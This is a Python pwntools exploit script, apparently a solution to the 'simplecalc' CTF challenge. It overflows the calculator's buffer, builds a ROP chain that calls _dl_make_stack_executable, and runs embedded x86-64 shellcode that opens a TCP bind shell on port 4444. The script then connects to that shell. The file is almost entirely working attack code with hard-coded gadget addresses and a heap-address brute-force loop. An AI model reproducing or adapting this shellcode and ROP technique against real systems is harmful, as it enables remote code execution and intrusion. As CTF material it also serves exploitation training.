#Something Calculator
from pwn import *
import math

def conv_scode():
	#TCP Bindshell(port 4444)
	scode = "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
        pad = (int(math.ceil(len(scode)/4.0))*4) - len(scode)
        for i in range(0,pad):
                scode += '\x00'
        n = len(scode)/4
        return struct.unpack('<' + 'I'*n,scode)

def gen_zero(r):
	r.send('2\n')
	r.send('100\n')
	r.send('100\n')

def main():

	#Gadgets used to set __stack_prot = 0x7
	g1 = 0x0044526f			#mov dword [rax], edx ; ret;
	g1_1 = 0x0044db34		#pop rax ; ret; where rax = stack_prot 
	g1_2 = 0x00437a85		#pop rdx ; ret; where rdx = 0x7
	stack_prot = 0x006C0FE0

	#Gadgets used to invoke _dl_make_stack_executable
	g2 = 0x004717e0			#_dl_make_stack_executable
	g2_1 = 0x00401b73		#pop rdi ; ret; where rdi = libc_stack_end
	libc_stack_end = 0x006C0F88

	#Gadget used to jump to shellcode
	g3 = 0x004b2a1b                 #jmp rsp;
	shell_code = conv_scode()
	
	#heap_base_addr = 0x006c3000	#When randomization is turned off
	heap_base_addr = 0x01d1e000 	#Brute force
	offset = 0x5be0
	free_addr = heap_base_addr + offset
		
	while True:
		#r = remote('simplecalc.bostonkey.party',5500)
		r = remote('127.0.0.1',1234)

		print r.recv()
		r.send('255\n')
		print r.recv()

		for i in range(0,18):
			if i!=12:
				gen_zero(r)
			else:
				r.send('2\n')
				free_addr += 100
				r.send(str(free_addr) + '\n')
				r.send('100\n')
		
		#Overwrite RA with ROP gadgets to invoke _dl_make_stack_executable and then jump to shellcode
		#G1_1
		r.send('2\n')
		g1_1 += 100
		r.send(str(g1_1) + '\n')
		r.send('100\n')
		gen_zero(r)
		
		#stack_prot
		r.send('2\n')
		stack_prot += 100
		r.send(str(stack_prot) + '\n')
		r.send('100\n')
		gen_zero(r)

		#G1_2
		r.send('2\n')
		g1_2 += 100
		r.send(str(g1_2) + '\n')
		r.send('100\n')
		gen_zero(r)

		#stack_prot_val
		r.send('2\n')
		r.send('100\n')
		r.send('93\n')
		gen_zero(r)

		#G1
		r.send('2\n')
		g1 += 100
		r.send(str(g1) + '\n')
		r.send('100\n')
		gen_zero(r)

		#G2_1
		r.send('2\n')
		g2_1 += 100
		r.send(str(g2_1) + '\n')
		r.send('100\n')
		gen_zero(r)

		#libc_stack_end
		r.send('2\n')
		libc_stack_end += 100
		r.send(str(libc_stack_end) + '\n')
		r.send('100\n')
		gen_zero(r)

		#G2
		r.send('2\n')
		g2 += 100
		r.send(str(g2) + '\n')
		r.send('100\n')
		gen_zero(r)

		#G3
		r.send('2\n')
		g3 += 100
		r.send(str(g3) + '\n')
		r.send('100\n')
		gen_zero(r)

		#Shellcode
		for scode in shell_code:
			r.send('2\n')
			scode += 100
			r.send(str(scode) + '\n')
			r.send('100\n')

		#Trigger memcpy overflow
		#import pdb;pdb.set_trace();
		r.send('5\n')

		time.sleep(4)
		try:
			#rs = remote('simplecalc.bostonkey.party',4444,timeout=6)
			rs = remote('127.0.0.1',4444,timeout=6)
			rs.interactive()
		except:
			print "Failed to execute shellcode"

if __name__ == "__main__":
	main()
